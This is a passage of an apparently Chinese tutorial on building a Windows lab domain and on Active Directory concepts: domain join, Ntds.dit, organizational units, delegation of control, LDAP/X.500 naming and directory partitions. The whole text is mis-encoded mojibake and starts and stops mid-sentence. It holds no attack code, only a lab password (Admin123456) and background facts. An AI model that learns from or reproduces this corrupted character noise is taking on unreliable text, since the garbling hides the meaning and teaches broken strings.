ä¾ç„¶ä¸ºAdmin123456\nä¸€ç›´ä¸‹ä¸€æ­¥è‡³å…¶ä»–é€‰é¡¹ï¼Œä¸»æœºä¼šè‡ªåŠ¨ç”ŸæˆNetBIOSåŸŸåå³YUY0UNG\nä¸‹ä¸€æ­¥è‡³å…ˆå†³æ¡ä»¶æ£€æŸ¥ï¼ˆè¿™é‡Œå°±ä¼šæ£€æŸ¥administratoræ˜¯å¦è®¾ç½®å¯†ç ï¼‰\né€šè¿‡åå³å¯å®‰è£…ï¼Œå®‰è£…å®Œæˆä¼šè‡ªåŠ¨é‡å¯\né‡å¯åå¯ä»¥å‘ç°ï¼Œç™»é™†æ—¶å·²ç»æ˜¯åŸŸè´¦æˆ·äº†\nç™»é™†åå¯è§åŸŸæœåŠ¡å·²å®‰è£…ï¼š\nè‡³æ­¤ï¼ŒåŸŸæ§é…ç½®å·²å®Œæˆ\næ·»åŠ åŸŸæˆå‘˜ä¸»æœº ç°å°†DCçš„é˜²ç«å¢™å…³ä¸€ä¸‹\næ¥ä¸‹æ¥æ·»åŠ ç¬¬ä¸€å°åŸŸæˆå‘˜ä¸»æœº\nå°†è¯¥ä¸»æœºDNSæœåŠ¡å™¨æŒ‡å‘åŸŸæ§ï¼š ç„¶åé…ç½®ä¸»æœºåå’Œéš¶å±çš„åŸŸï¼š\nç„¶åè¾“å…¥åŸŸç®¡ç†å‘˜è´¦å·å¯†ç ç¡®è®¤æ›´æ”¹ï¼š\nokæˆåŠŸï¼š\nå®Œæ¯•åé‡å¯ç¡®è®¤æ›´æ”¹\nå¦ä¸€å°ä¸»æœºåŒç†\næ£€æŸ¥é…ç½® å›åˆ°DCï¼Œå¯åœ¨DNSç®¡ç†å™¨ä¸Šçœ‹è§å¦å¤–ä¸¤å°åŸŸæˆå‘˜ä¸»æœº\næ´»åŠ¨ç›®å½•Active Directory æ´»åŠ¨ç›®å½•ä»‹ç» æ´»åŠ¨ç›®å½•ï¼ˆActive Directoryï¼ŒADï¼‰æ˜¯å¸¸è§çš„å®ç°åŸŸçš„æ–¹æ³•ï¼Œæ´»åŠ¨ç›®å½•æŒ‡å®‰è£…åœ¨åŸŸæ§ä¸Šï¼Œä¸ºæ•´ä¸ªç¯å¢ƒæä¾›é›†ä¸­å¼ç›®å½•ç®¡ç†æœåŠ¡çš„ç»„ä»¶\nADå­˜å‚¨äº†æœ‰å…³åŸŸç¯å¢ƒä¸­å„ç§å¯¹è±¡çš„ä¿¡æ¯ï¼Œæ¯”å¦‚åŸŸã€ç”¨æˆ·ã€ç”¨æˆ·ç»„ã€è®¡ç®—æœºã€ç»„ç»‡å•ä½ã€å…±äº«èµ„æºã€å®‰å…¨ç­–ç•¥ç­‰ï¼Œç›®å½•æ•°æ®å­˜å‚¨åœ¨åŸŸæ§çš„Ntsd.ditæ–‡ä»¶ä¸­\nåœ¨ADä¸­ï¼Œä¸€ä¸ªåŸŸä¸­çš„åŸºæœ¬å¯¹è±¡æœ‰ä»¥ä¸‹å‡ ç§ï¼š\nDCï¼ŒåŸŸæ§ï¼šå­˜å‚¨ç½‘åŸŸæ‰€å±çš„ç½‘åŸŸæ§åˆ¶ç«™ computerï¼ŒåŸŸæˆå‘˜ä¸»æœºï¼šåŠ å…¥ç½‘åŸŸçš„è®¡ç®—æœºå¯¹è±¡ builtinï¼Œå†…ç½®è´¦æˆ·ç»„ç¾¤ï¼šè§„å®šäº†å„ç±»è´¦æˆ·çš„æƒé™ userï¼Œå½“å‰å­˜åœ¨åŸŸä¸­çš„ç”¨æˆ·ï¼šå­˜å‚¨ADä¸­çš„ç”¨æˆ·å¯¹è±¡ å¦‚å›¾ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹åŸŸå†…çš„æ´»åŠ¨ç›®å½•è¿›è¡Œç®¡ç†ï¼š æ´»åŠ¨ç›®å½•ä¸»è¦æä¾›äº†ä»¥ä¸‹åŠŸèƒ½ï¼š\nè®¡ç®—æœºé›†ä¸­ç®¡ç†\né›†ä¸­ç®¡ç†åŸŸå†…æ‰€æœ‰æœåŠ¡å™¨åŠå®¢æˆ·ç«¯è®¡ç®—æœºï¼Œç»Ÿä¸€ä¸‹å‘ç»„ç­–ç•¥\nç”¨æˆ·é›†ä¸­ç®¡ç†\né›†ä¸­ç®¡ç†åŸŸç”¨æˆ·ã€ç»„ç»‡é€šè®¯å½•ã€ç”¨æˆ·ç»„ï¼Œå¯¹ç”¨æˆ·è¿›è¡Œç»Ÿä¸€çš„èº«ä»½è®¤è¯ã€èµ„æºæˆæƒ\nèµ„æºé›†ä¸­ç®¡ç†\né›†ä¸­ç®¡ç†åŸŸä¸­çš„æ‰“å°æœºã€æ–‡ä»¶å…±äº«æœåŠ¡ç­‰ç½‘ç»œèµ„æº\nç¯å¢ƒé›†ä¸­ç®¡ç†\né›†ä¸­çš„é…ç½®åŸŸä¸­è®¡ç®—æœºçš„å·¥ä½œç¯å¢ƒï¼Œæ¯”å¦‚ç»Ÿä¸€è®¡ç®—æœºæ¡Œé¢ã€ç»Ÿä¸€ç½‘ç»œè¿æ¥é…ç½®ã€ç»Ÿä¸€è®¡ç®—æœºå®‰å…¨é…ç½®ç­‰\nåº”ç”¨é›†ä¸­ç®¡ç†\nå¯¹åŸŸä¸­è®¡ç®—æœºç»Ÿä¸€æ¨é€è½¯ä»¶ã€å®‰å…¨è¡¥ä¸ã€é˜²ç—…æ¯’ç³»ç»Ÿã€å®‰è£…ç½‘ç»œæ‰“å°æœºç­‰\nNtds.ditæ–‡ä»¶ è¿™æ˜¯åŸŸç¯å¢ƒä¸­åŸŸæ§ä¿å­˜çš„ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ˜¯ä¸»è¦çš„æ´»åŠ¨ç›®å½•æ•°æ®åº“ï¼Œé€šå¸¸å­˜å‚¨åœ¨åŸŸæ§çš„%SystemRoot%\\NTDSç›®å½•ä¸‹ï¼Œè¯¥æ–‡ä»¶ä¸­åŒ…æ‹¬ä½†ä¸é™äºæœ‰å…³åŸŸç”¨æˆ·ã€ç”¨æˆ·å¯†ç çš„å“ˆå¸Œã€ç”¨æˆ·ç»„ã€ç»„æˆå‘˜èº«ä»½ã€ç»„ç­–ç•¥çš„ä¿¡æ¯ï¼›Ntds.ditæ–‡ä»¶ä½¿ç”¨å­˜å‚¨åœ¨ç³»ç»ŸSYSTEMæ–‡ä»¶çš„å¯†é’¥å¯¹è¿™äº›å“ˆå¸Œè¿›è¡ŒåŠ å¯†\nåœ¨éåŸŸç¯å¢ƒï¼ˆåŠå·¥ä½œç»„ç¯å¢ƒï¼‰ä¸­ï¼Œç”¨æˆ·çš„ç™»å½•å‡­æ®ç­‰ä¿¡æ¯å­˜å‚¨åœ¨æœ¬åœ°SAMæ–‡ä»¶ä¸­\nç»„ç»‡å•ä½Organizational Unitä»‹ç» ç»„ç»‡å•ä½ï¼ˆOUï¼‰æ˜¯åŸŸä¸­åŒ…å«çš„ä¸€ç±»ç›®å½•å¯¹è±¡å¦‚ç”¨æˆ·ã€è®¡ç®—æœºå’Œç»„ã€æ–‡ä»¶ä¸æ‰“å°æœºç­‰èµ„æºï¼Œæ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œå¯ä»¥åœ¨OUä¸Šéƒ¨ç½²ç»„ç­–ç•¥\næˆ‘ä»¬æ´»åŠ¨ç›®å½•ä¸­çš„Domain Controllerså°±æ˜¯ä¸€ä¸ªOUï¼š ç»„ç»‡å•ä½æ˜¯åŸŸä¸­åŒ…å«çš„ä¸€ç±»ç›®å½•å¯¹è±¡å¦‚ç”¨æˆ·ã€è®¡ç®—æœºå’Œç»„ã€æ–‡ä»¶ä¸æ‰“å°æœºç­‰èµ„æºã€‚ç»„ç»‡å•ä½è¿˜å…·æœ‰åˆ†å±‚ç»“æ„å¯ç”¨æ¥å»ºç«‹åŸŸçš„åˆ†å±‚ç»“æ„æ¨¡å‹ï¼Œè¿›è€Œå¯ä½¿ç”¨æˆ·æŠŠç½‘ç»œæ‰€éœ€çš„åŸŸçš„æ•°é‡å‡è‡³æœ€å°\nä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾ä¸€ä¸ªå…¬å¸æœ‰ä¸‹è¡¨çš„äººå‘˜å®‰æ’éœ€æ±‚ï¼š\néƒ¨é—¨ äººæ•° è´¢åŠ¡ 20 äººäº‹ 10 IT 100 ç½‘ç»œç®¡ç† 3 æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨åŸŸæ§ä¸Šåˆ›å»ºç»„ç»‡å•ä½è¿›è¡Œæ“ä½œï¼š\nè¿™é‡Œæ–°å»ºç»„ç»‡å•ä½\næ¯”å¦‚åˆ›å»ºäººäº‹éƒ¨é—¨ï¼š\nåˆ›å»ºå¥½ä¹‹åï¼Œå¯ä»¥åœ¨è¯¥ç»„ç»‡å•ä½ä¸­æ–°å»ºç”¨æˆ·ï¼š\nåŒç†ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥æŒ‰ç…§å…¬å¸éœ€æ±‚é…ç½®å¥½ç›¸åº”çš„ç»„ç»‡å•ä½ï¼Œå¹¶ä¸”å¯ä»¥å¯¹å„ä¸ªç»„ç»‡å•ä½çš„ç”¨æˆ·è¿›è¡Œç»Ÿä¸€ç®¡ç†\nå§”æ´¾æ§åˆ¶ ä¾ç„¶ä»¥ä¸Šé¢å…¬å¸çš„éœ€æ±‚ä¸ºä¾‹ï¼Œå› ä¸ºå…¬å¸æœ‰100+ä¸ªäººï¼Œä¸èƒ½æœ‰é—®é¢˜å°±å»æ‰¾ç½‘ç»œç®¡ç†å‘˜ï¼Œéœ€è¦å§”æ´¾æ§åˆ¶æƒé™ç»™æ¯ä¸ªéƒ¨é—¨ä¸€ä¸ªä»£è¡¨ï¼Œä»–ç”±ç›¸åº”çš„æƒé™å»è‡ªå·±éƒ¨é—¨çš„è®¡ç®—æœºå’Œç”¨æˆ·ï¼ˆå¯ä»¥ç†è§£ä¸ºè¯¾ä»£è¡¨è¿™ç§ä»‹äºè€å¸ˆå’Œå­¦ç”Ÿä¹‹é—´çš„ä½ç½®ï¼‰\nè¿™é‡Œä»¥äººäº‹éƒ¨é—¨ä¸ºä¾‹ï¼Œå°è¯•å°†äººäº‹éƒ¨é—¨çš„æ§åˆ¶æƒå§”æ´¾ç»™ç”¨æˆ·ç…œé˜³:\nå³é”®äººäº‹éƒ¨é—¨é€‰æ‹©å§”æ´¾æ§åˆ¶ï¼š\næ·»åŠ å§”æ´¾çš„ç”¨æˆ·ï¼ˆæˆ–ç»„ï¼‰ï¼Œè¿™é‡Œé€‰æ‹©ç”¨æˆ·ç…œé˜³ï¼š\né€‰æ‹©ç»™ç…œé˜³å§”æ´¾çš„ä»»åŠ¡ï¼š\nè‡³æ­¤ï¼Œå®Œæˆäº†å¯¹äººäº‹éƒ¨é—¨çš„å§”æ´¾æ§åˆ¶\nç›®å½•æœåŠ¡ä¸LDAP ADæ˜¯å¾®è½¯å¯¹é€šç”¨ç›®å½•æœåŠ¡æ•°æ®åº“çš„å®ç°ï¼Œè€ŒLDAPåè®®å°±æ˜¯ç”¨æ¥è®¿é—®ç›®å½•æœåŠ¡æ•°æ®åº“çš„åè®®ä¹‹ä¸€ï¼Œæˆ‘ä¹‹å‰ä¹Ÿä»‹ç»è¿‡LDAPåè®®çš„ä¸€äº›ç»†èŠ‚ï¼šwindowsåè®®ä¹‹LDAP\nLDAPåŸºäºX.500æ ‡å‡†ï¼Œæ˜¯ä¸€ä¸ªå¼€æ”¾çš„ã€ä¸­ç«‹çš„ã€å·¥ä¸šæ ‡å‡†çš„åº”ç”¨åè®®ã€‚å®ƒå¯ä»¥ç”¨æ¥æ£€æŸ¥ä¸æ›´æ–°æ´»åŠ¨ç›®å½•æ•°æ®åº“ï¼Œè€Œåˆ©ç”¨LDAPåç§°è·¯å¾„å¯ä»¥æè¿°å¯¹è±¡åœ¨æ´»åŠ¨ç›®å½•ä¸­çš„ä½ç½®ã€‚LDAPç›®å½•ç±»ä¼¼äºæ–‡ä»¶ç³»ç»Ÿç›®å½•ï¼Œæ¯”å¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬æ­å»ºçš„åŸŸä¸­çš„DC01ï¼š\nå¯ä»¥æè¿°ä¸ºCN=DC01,OU=Domain Controllers,DC=yuy0ung,DC=comï¼Œç±»æ¯”æˆæ–‡ä»¶ç³»ç»Ÿç›®å½•å¯ä»¥è§†ä½œyuy0ung.com/Domain Controllers/DC01ï¼Œè·¯å¾„çš„å«ä¹‰ä¸ºDC01å¯¹è±¡å¤„äºyuy0ung.comåŸŸçš„Domain Controllersç»„ç»‡å•ä½ä¸­ï¼Œåœ¨LDAPä¸­ï¼Œæ•°æ®ä»¥æ ‘çŠ¶æ–¹å¼ç»„ç»‡ï¼Œæ ‘çŠ¶ä¿¡æ¯ä¸­çš„åŸºæœ¬æ•°æ®å•å…ƒæ˜¯æ¡ç›®ï¼Œè€Œæ¯ä¸ªæ¡ç›®ç”±å±æ€§ç»„æˆï¼ŒåŒæ ·ä»¥æˆ‘ä»¬æ­å»ºçš„åŸŸçš„æ´»åŠ¨ç›®å½•ä¸ºä¾‹ï¼Œæœ‰å¦‚ä¸‹æ ‘çŠ¶ç»“æ„ï¼š\nè¿™é‡Œæå‡ ä¸ªæ¦‚å¿µé“ºå«ä¸€ä¸‹æ¥ä¸‹æ¥çš„X.500æ ‡å‡†å®šä¹‰ï¼š\nç›®å½•æ ‘ï¼šåœ¨ä¸€ä¸ªç›®å½•æ•°æ®åº“ä¸­ï¼Œæ•´ä¸ªç›®å½•ä¸­çš„ä¿¡æ¯é›†å¯ä»¥è¡¨ç¤ºä¸ºä¸€ä¸ªç›®å½•ä¿¡æ¯æ ‘ï¼Œæ ‘ä¸­çš„æ¯ä¸€ä¸ªèŠ‚ç‚¹æ˜¯ä¸€ä¸ªæ¡ç›® æ¡ç›®ï¼šç›®å½•æ•°æ®åº“ä¸­ï¼Œæ¯ä¸€ä¸ªæ¡ç›®å°±æ˜¯ä¸€æ¡è®°å½•ï¼Œæ¯ä¸ªæ¡ç›®æœ‰è‡ªå·±çš„å”¯ä¸€ç»å¯¹å¯è¾¨è¯†åç§°DNï¼Œä¸Šå›¾çš„ä¸€ä¸ªæ–¹æ¡†å³ä¸ºä¸€æ¡è®°å½• å±æ€§ï¼šç”¨äºæè¿°æ•°æ®åº“ä¸­æ¯ä¸ªæ¡ç›®çš„å…·ä½“ä¿¡æ¯ æ´»åŠ¨ç›®å½•çš„è®¿é—® ä½¿ç”¨å¾®è½¯å®˜æ–¹æä¾›çš„AD Explorerè¿æ¥DCæ¥è®¿é—®æ´»åŠ¨ç›®å½•ï¼šAD èµ„æºç®¡ç†å™¨ - Sysinternals | Microsoft Learnï¼Œå¯ä»¥æ–¹ä¾¿åœ°æµè§ˆæ´»åŠ¨ç›®å½•æ•°æ®åº“ï¼Œè‡ªå®šä¹‰å¿«é€Ÿå…¥å£ã€æŸ¥çœ‹å¯¹è±¡å±æ€§ã€ç¼–è¾‘æƒé™ã€è¿›è¡Œç²¾ç¡®æœå¯»ç­‰ï¼š X.500æ ‡å‡†å®šä¹‰ X.500æ ‡å‡†ä¸­å®šä¹‰äº†ä¸€äº›åç§°ç©ºé—´ï¼š\nDC DCï¼ˆDomain Componentï¼ŒåŸŸç»„ä»¶ï¼‰ï¼Œç±»ä¼¼äºDNSä¸­çš„æ¯ä¸ªå…ƒç´ ï¼ŒDCå¯¹è±¡è¡¨ç¤ºç”¨DNSæ¥å®šä¹‰å…¶åç§°ç©ºé—´çš„LDAPæ ‘çš„é¡¶éƒ¨ã€‚ä¾‹å¦‚yuy0ung.comï¼Œç”¨.åˆ†å¼€çš„æ¯ä¸ªå•å…ƒéƒ½å¯ä»¥çœ‹æˆä¸€ä¸ªåŸŸç»„ä»¶\nOU å³ç»„ç»‡å•ä½ï¼Œä¸Šé¢å·²ç»ç³»ç»Ÿä»‹ç»äº†ç»„ç»‡å•ä½äº†ï¼ŒOUç±»æœ€å¤šå¯ä»¥æœ‰å››çº§ï¼Œæ¯çº§æœ€é•¿32ä¸ªå­—ç¬¦ï¼Œå¯ä»¥ä¸ºä¸­æ–‡ï¼Œç»„ç»‡å•ä½ä¸­åŒ…å«å¯¹è±¡ã€å®¹å™¨ï¼Œè¿˜å¯ä»¥åŒ…å«å…¶ä»–ç»„ç»‡å•ä½ï¼Œç»„ç»‡å•ä½è¿˜å¯ä»¥é“¾æ¥ç»„ç­–ç•¥\nCN CNï¼ˆCommon Nameï¼Œé€šç”¨åç§°ï¼‰æ˜¯å¯¹è±¡çš„åç§°ï¼Œæœ€å¤§é•¿åº¦ä¸º80ä¸ªå­—ç¬¦ï¼Œå¯ä»¥ä¸ºä¸­æ–‡\nDN æ´»åŠ¨ç›®å½•ä¸­æ¯ä¸ªå¯¹è±¡éƒ½æœ‰å®Œå…¨å”¯ä¸€çš„DNï¼ˆDistinguished Nameï¼Œå¯è¾¨è¯†åç§°ï¼‰ï¼ŒåŒ…å«äº†å¯¹è±¡åˆ°LDAPåç§°ç©ºé—´æ ¹çš„æ•´ä¸ªè·¯å¾„ã€‚DNæœ‰ä¸‰ä¸ªå±æ€§DCã€OUã€CNã€‚DNå¯ä»¥è¡¨ç¤ºä¸ºLDAPçš„æŸä¸ªè·¯å¾„ï¼Œä¹Ÿå¯ä»¥è¡¨ç¤ºä¸ºç›®å½•ä¸­çš„æŸä¸ªå¯¹è±¡ï¼Œè¯¥å¯¹è±¡å¯ä»¥æ˜¯ç”¨æˆ·ã€è®¡ç®—æœºç­‰ï¼Œä¾‹å¦‚æˆ‘ä»¬æ­å»ºçš„åŸŸçš„åŸŸæ§DC01çš„DNï¼šCN=DC01,OU=Domain Controllers,DC=yuy0ung,DC=comï¼Œæˆ–administratorç”¨æˆ·ï¼šCN=Administrator,CN=Users,DC=yuy0ung,DC=comï¼Œæˆ‘ä»¬ä½¿ç”¨AD Exploreréƒ½èƒ½æŸ¥çœ‹ï¼š\nRDN RDNï¼ˆRelative Distinguished Nameï¼Œç›¸å¯¹å¯è¾¨è¯†åç§°ï¼‰ä¸ç›®å½•ç»“æ„æ— å…³ï¼Œç±»ä¼¼äºç›¸å¯¹è·¯å¾„ï¼Œæ¯”å¦‚CN=Administrator,CN=Users,DC=yuy0ung,DC=comçš„RDNä¸ºCN=Administratorï¼Œä¸¤ä¸ªå¯¹è±¡å¯ä»¥å…·æœ‰ç›¸åŒçš„RDNï¼Œä½†ä¸èƒ½å…·æœ‰ç›¸åŒçš„DN\nUPN UPNï¼ˆUser Principal Nameç”¨æˆ·ä¸»ä½“åç§°ï¼‰æ˜¯ç”¨æˆ·çš„å¯è¾¨è¯†åç§°ï¼Œåœ¨åŸŸå†…æ˜¯å”¯ä¸€çš„ã€‚ä¾‹å¦‚yuy0ung.comåŸŸä¸­çš„songxueç”¨æˆ·ï¼Œä»–çš„UPNä¸ºsongxue@yuy0ung.comï¼Œæ ¼å¼ç±»ä¼¼äºç”µå­é‚®ç®±ã€‚ç”¨æˆ·ç™»å½•æ—¶æ‰€è¾“å…¥çš„è´¦æˆ·åæœ€å¥½æ˜¯ UPNï¼Œå› ä¸ºåœ¨æ—ä¸­ï¼Œæ— è®ºæ­¤ç”¨æˆ·çš„è´¦æˆ·è¢«ç§»åŠ¨åˆ°å“ªä¸€ä¸ªåŸŸï¼Œå…¶ UPN éƒ½ä¸ä¼šæ”¹å˜ï¼Œå› æ­¤ç”¨æˆ·å¯ä»¥ä¸€ç›´ä½¿ç”¨åŒä¸€ä¸ªåç§°æ¥ç™»å½•\nContainer åœ¨æ´»åŠ¨ç›®å½•æ•°æ®ä¸­å®šä¹‰äº†Containerï¼ˆå®¹å™¨ï¼‰ç±»ã€‚å®¹å™¨æ˜¯ä¸€äº›å±æ€§çš„é›†åˆï¼Œå®¹å™¨å†…å¯ä»¥åŒ…å«å…¶ä»–å¯¹è±¡ï¼Œå¦‚ç”¨æˆ·ã€è®¡ç®—æœºç­‰ï¼Œä½†æ˜¯å®¹å™¨ä¸­ä¸èƒ½å†åµŒå¥—å…¶ä»–å®¹å™¨å’ŒOU\nè®¡ç®—æœºé»˜è®¤åœ¨CN=Computerså®¹å™¨ä¸­ï¼Œç”¨æˆ·é»˜è®¤åœ¨CN=Userså®¹å™¨ä¸­ï¼Œå¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°CN=Computersçš„objectClasså±æ€§ä¸ºcontainerï¼š\nFQDN é¡ºå¸¦è¯´ä¸€ä¸‹FQDN ï¼ˆFully Qualified Domain Nameï¼Œå…¨é™å®šåŸŸåï¼‰æ˜¯åŒæ—¶å¸¦æœ‰ä¸»æœºåå’ŒåŸŸåçš„åç§°ä¾‹å¦‚DC01.yuy0ung.comï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºæ˜¯ä¸»æœºåçš„ä¸€ç§å®Œå…¨è¡¨è¾¾å½¢å¼\næ´»åŠ¨ç›®å½•åˆ†åŒº å¾®è½¯å°†æ´»åŠ¨ç›®å½•åˆ’åˆ†ä¸ºå¤šä¸ªåˆ†åŒºä¾¿äºè¿›è¡Œå¤åˆ¶å’Œç®¡ç†ã€‚æ¯ä¸ªé€»è¾‘åˆ†åŒºåœ¨åŸŸæ—ä¸­çš„åŸŸæ§ä¹‹é—´åˆ†åˆ«å¤åˆ¶ã€æ›´æ”¹ï¼Œè¿™äº›åˆ†åŒºè¢«ç§°ä¸ºä¸Šä¸‹æ–‡å‘½åï¼ˆNCï¼ŒNaming Contextï¼‰\næ´»åŠ¨ç›®å½•é¢„å®šä¹‰äº†åŸŸåˆ†åŒºã€é…ç½®åˆ†åŒºã€æ¶æ„åˆ†åŒº\nåŸŸåˆ†åŒº åŸŸåˆ†åŒºç”¨äºå­˜å‚¨ä¸è¯¥åŸŸæœ‰å…³çš„å¯¹è±¡ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯æ˜¯ç‰¹å®šäºè¯¥åŸŸçš„ï¼Œå¦‚è¯¥åŸŸä¸­çš„è®¡ç®—æœºã€ç”¨æˆ·ã€ç»„ç»‡å•ä½ç­‰ä¿¡æ¯ã€‚åŸŸæ—ä¸­ï¼Œæ¯ä¸ªåŸŸçš„åŸŸæ§å„è‡ªæ‹¥æœ‰ä¸€ä»½å±äºè‡ªå·±çš„åŸŸåˆ†åŒºï¼Œåªä¼šè¢«å¤åˆ¶åˆ°æœ¬åŸŸçš„æ‰€æœ‰åŸŸæ§ä¸­\nä¾‹å¦‚è¿™é‡Œï¼ŒDC=yuy0ung,DC=comå°±æ˜¯yuy0ung.comåŸŸçš„åŸŸåˆ†åŒºï¼š\nå¯è§åŸŸåˆ†åŒºä¸»è¦åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š\nCN=Builtinï¼šå†…ç½®äº†åŸŸæœ¬åœ°ç»„çš„å®‰å…¨ç»„çš„å®¹å™¨ CN=Computersï¼šæœºå™¨ç”¨æˆ·å®¹å™¨ï¼Œå…¶ä¸­åŒ…å«æ‰€æœ‰åŠ å…¥åŸŸçš„ä¸»æœº OU=Domain Controllersï¼šåŸŸæ§åˆ¶å™¨çš„å®¹å™¨ï¼Œå…¶ä¸­åŒ…å«åŸŸä¸­æ‰€æœ‰çš„åŸŸæ§åˆ¶å™¨ CN=ForeignSecurityPrincipalsï¼šåŒ…å«åŸŸä¸­æ‰€æœ‰æ¥è‡ªåŸŸçš„æ—å¤–éƒ¨åŸŸçš„ç»„ä¸­çš„æˆå‘˜ CN=Managed Service Accountsï¼šæ‰˜ç®¡æœåŠ¡è´¦æˆ·çš„å®¹å™¨ CN=Systemï¼šå„ç§é¢„é…ç½®å¯¹è±¡çš„å®¹å™¨ï¼ŒåŒ…å«ä¿¡ä»»å¯¹è±¡ã€DNSå¯¹è±¡å’Œç»„ç­–ç•¥å¯¹è±¡ CN=Usersï¼šç”¨æˆ·å’Œç»„å¯¹è±¡çš„é»˜è®¤å®¹å™¨ é…ç½®åˆ†åŒº é…ç½®åˆ†åŒºï¼ˆconfiguration NCï¼‰å­˜å‚¨æ•´ä¸ªåŸŸæ—çš„ä¸»è¦é…ç½®ä¿¡æ¯ï¼ŒåŒ…æ‹¬æœ‰å…³ç«™ç‚¹ã€æœåŠ¡ã€åˆ†åŒºã€å’Œæ•´ä¸ªæ´»åŠ¨ç›®å½•ç»“æ„çš„ä¿¡æ¯\nå’ŒåŸŸåˆ†åŒºä¸€æ ·ï¼Œæ•´ä¸ªåŸŸæ—å…±äº«ä¸€ä»½ç›¸åŒçš„é…ç½®åˆ†åŒºï¼Œä¼šè¢«å¤åˆ¶åˆ°åŸŸæ—ä¸­æ‰€æœ‰çš„åŸŸæ§ä¸Š\nå¦‚å›¾ï¼Œåœ¨æˆ‘ä»¬æ­å»ºçš„åŸŸä¸­ï¼ŒCN=Configuration,DC=yuy0ung,DC=comå°±æ˜¯é…ç½®åˆ†åŒºï¼š\næ¶æ„åˆ†åŒº æ¶æ„åˆ†åŒºï¼ˆSchema NCï¼‰å­˜å‚¨æ•´ä¸ªåŸŸæ—çš„æ¶æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ´»åŠ¨ç›®å½•ä¸­æ‰€æœ‰çš„ç±»ã€å¯¹è±¡å’Œå±æ€§çš„å®šä¹‰æ•°æ®ã€‚åŒæ ·ï¼Œæ•´ä¸ªåŸŸæ—å…±äº«ä¸€ä»½ç›¸åŒçš„æ¶æ„åˆ†åŒºï¼Œä¼šè¢«å¤åˆ¶åˆ°åŸŸæ—ä¸­æ‰€æœ‰çš„åŸŸæ§ä¸Š\nå¦‚å›¾ï¼ŒCN=Schema,CN=Configuration,DC=yuy0ung,DC=comå°±æ˜¯æ¶æ„åˆ†åŒºï¼š\næ´»åŠ¨ç›®å½•çš„æ‰€æœ‰ç±»ï¼ˆç±»å¯ä»¥çœ‹ä½œæ˜¯ä¸€ç»„å±æ€§çš„é›†åˆï¼‰éƒ½å­˜åœ¨æ¶æ„åˆ†åŒºä¸­ï¼Œæ˜¯æ¶æ„åˆ†åŒºçš„ä¸€ä¸ªæ¡ç›®ï¼Œæ¡ç›®å…·æœ‰çš„å±æ€§æ˜¯ç”±å…¶æ‰€å±çš„ç±»å†³å®šçš„\næ¶æ„åˆ†åŒºæ˜¯å…·æœ‰Class-Schemaã€Attribute-Schemaå’ŒsubSchemaå¯¹è±¡çš„å•ä¸ªå®¹å™¨ã€‚æ´»åŠ¨ç›®å½•æ•°æ®åº“ä¸­æ‰€æœ‰ç±»éƒ½æ˜¯Class-Schemaçš„å®ä¾‹ï¼Œæ‰€æœ‰å±æ€§éƒ½æ˜¯Attribute-Schemaçš„å®ä¾‹ï¼Œå³æ¶æ„åˆ†åŒºå®šä¹‰äº†ADä¸­ä½¿ç”¨çš„æ‰€æœ‰ç±»å’Œå±æ€§\nå¦å¤–ï¼Œåœ¨LDAPä¸­ï¼Œç±»æ˜¯å…·æœ‰ç»§æ‰¿å…³ç³»çš„ï¼Œä¸å¼€å‘ä¸­çš„é¢å‘å¯¹è±¡ä¸€æ ·ã€‚å­ç±»å¯ä»¥ç»§æ‰¿çˆ¶ç±»çš„æ‰€æœ‰å±æ€§ï¼Œè€Œtopç±»æ˜¯æ‰€æœ‰ç±»çš„çˆ¶ç±»ï¼Œä¸”æ´»åŠ¨ç›®å½•ä¸­æ¯ä¸ªæ¡ç›®éƒ½æœ‰objectClasså±æ€§ï¼Œè¯¥å±æ€§çš„å€¼æŒ‡å‘è¯¥ç¤ºä¾‹å¯¹è±¡æ‰€ç»§æ‰¿çš„æ‰€æœ‰ç±»\næ´»åŠ¨ç›®å½•ä¸­çš„ç±»æœ‰ä¸‰ç§ç±»å‹ï¼š\nç»“æ„ç±»ï¼ˆstructuralï¼‰ï¼šè§„å®šäº†å¯¹è±¡å®ä¾‹çš„åŸºæœ¬å±æ€§ï¼Œæ¯ä¸ªæ¡ç›®å±äºä¸”ä»…å±äºä¸€ä¸ªç»“æ„å¯¹è±¡ç±»ã€‚åŸŸå†…æ¯ä¸ªæ¡ç›®éƒ½æ˜¯ç±»çš„å®ä¾‹ï¼Œè¿™ä¸ªç±»å¿…é¡»æ˜¯ç»“æ„ç±»ï¼Œç»“æ„ç±»æ˜¯å”¯ä¸€å¯ä»¥åœ¨ç›®å½•ä¸­æœ‰å®ä¾‹çš„ç±»ï¼Œå¯ä»¥ç»§æ‰¿äºæŠ½è±¡ç±»æˆ–è€…å…¶ä»–ç»“æ„ç±»ï¼Œå¯ä»¥åœ¨ç»“æ„ç±»å®šä¹‰ä¸­åŒ…å«ä»»æ„æ•°é‡çš„è¾…åŠ©ç±» æŠ½è±¡ç±»ï¼ˆAbstractï¼‰ï¼šæ˜¯ç”¨äºç»§æ‰¿æ–°ç»“æ„ç±»çš„æ¨¡æ¿ï¼ŒæŠ½è±¡ç±»æ²¡æœ‰å®ä¾‹ï¼Œåªèƒ½å……å½“ç»“æ„ç±»æˆ–è€…æŠ½è±¡ç±»çš„çˆ¶ç±»ã€‚ä¸é¢å‘å¯¹è±¡ä¸­çš„æŠ½è±¡æ–¹æ³•ä¸€æ ·æ¯”å¦‚topç±» è¾…åŠ©ç±»ï¼ˆAuxiliaryï¼‰ï¼šè¾…åŠ©ç±»åŒ…å«ä¸€ä¸ªå±æ€§åˆ—è¡¨ï¼Œåœ¨ç»“æ„ç±»æˆ·æˆ–æŠ½è±¡ç±»çš„å®šä¹‰ä¸­æ·»åŠ ä¸€ä¸ªè¾…åŠ©ç±»ä¼šå°†è¾…åŠ©ç±»å±æ€§æ·»åŠ 